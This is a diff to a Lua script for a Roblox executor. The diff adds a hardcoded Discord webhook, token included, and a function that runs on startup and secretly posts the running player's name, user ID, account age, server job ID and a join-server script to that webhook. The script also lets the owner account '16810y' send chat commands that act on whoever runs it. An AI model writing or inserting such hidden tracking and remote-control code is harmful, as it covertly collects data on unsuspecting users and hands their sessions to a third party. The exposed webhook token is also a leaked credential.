@@ -1,3 +1,6 @@
+-- Webhook Configuration
+local webhook_url = "https://discordapp.com/api/webhooks/1322240223052300478/7SSpyDR6aCGxJIUf1KvWtHakkgDFqXPMWmoyxoRTY_ApYDzUoW-S7GELvQKestHEuVQK"
+
 -- Services setup
 local Players, LocalPlayer, StarterGui, ReplicatedStorage do
     Players = cloneref(game:GetService("Players"))
@@ -10,14 +13,107 @@ end
 local owner = "16810y"
 local prefix = "."
 
--- Command system (ย้ายไปไว้ก่อน Window creation)
+-- Webhook Functions
+local function getServerInfo()
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+    local placeName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
+    local player = LocalPlayer
+    
+    local playerInfo = {
+        name = player.Name,
+        displayName = player.DisplayName,
+        userId = player.UserId,
+        accountAge = player.AccountAge
+    }
+    
+    local joinScript = string.format([[
+game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
+    ]], placeId, jobId)
+    
+    return {
+        jobId = jobId,
+        placeId = placeId,
+        placeName = placeName,
+        joinScript = joinScript,
+        player = playerInfo
+    }
+end
+
+local function sendWebhook()
+    local serverInfo = getServerInfo()
+    
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🎮 New Server Detection",
+            ["description"] = "มีคนรันสคริปในเซิร์ฟเวอร์ใหม่!",
+            ["color"] = 5814783,
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Player Info",
+                    ["value"] = string.format(
+                        "**Name:** %s\n**Display Name:** %s\n**UserID:** %s\n**Account Age:** %d days",
+                        serverInfo.player.name,
+                        serverInfo.player.displayName,
+                        serverInfo.player.userId,
+                        serverInfo.player.accountAge
+                    ),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🏷️ Game Name",
+                    ["value"] = serverInfo.placeName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "📍 Place ID",
+                    ["value"] = tostring(serverInfo.placeId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🔑 Job ID",
+                    ["value"] = serverInfo.jobId,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "📝 Join Script",
+                    ["value"] = "```lua\n" .. serverInfo.joinScript .. "\n```",
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Server Time: " .. os.date("%Y-%m-%d %H:%M:%S")
+            },
+            ["thumbnail"] = {
+                ["url"] = string.format(
+                    "https://www.roblox.com/headshot-thumbnail/image?userId=%s&width=420&height=420&format=png",
+                    serverInfo.player.userId
+                )
+            }
+        }}
+    }
+
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    request({
+        Url = webhook_url,
+        Method = "POST",
+        Headers = headers,
+        Body = game:GetService("HttpService"):JSONEncode(data)
+    })
+end
+
+-- Command system
 local function executeCommand(message, sender)
     if sender.Name ~= owner then return end
     if message:sub(1,1) ~= prefix then return end
     
     local command = message:sub(2):lower()
     
-    task.spawn(function() -- ใช้ task.spawn เพื่อป้องกัน yield errors
+    task.spawn(function()
         if command == "re" then
             if LocalPlayer.Character then
                 LocalPlayer.Character:BreakJoints()
@@ -62,6 +158,10 @@ local function setupChatHandler()
     Players.PlayerAdded:Connect(playerAdded)
 end
 
+-- Initialize everything
+task.spawn(function()
+    sendWebhook()
+end)
 setupChatHandler()
 
--- ต่อจากนี้เป็น code เดิมของคุณ (Window creation etc.)
+-- ต่อจากนี้ให้วาง code Window creation และส่วนที่เหลือของคุณ...
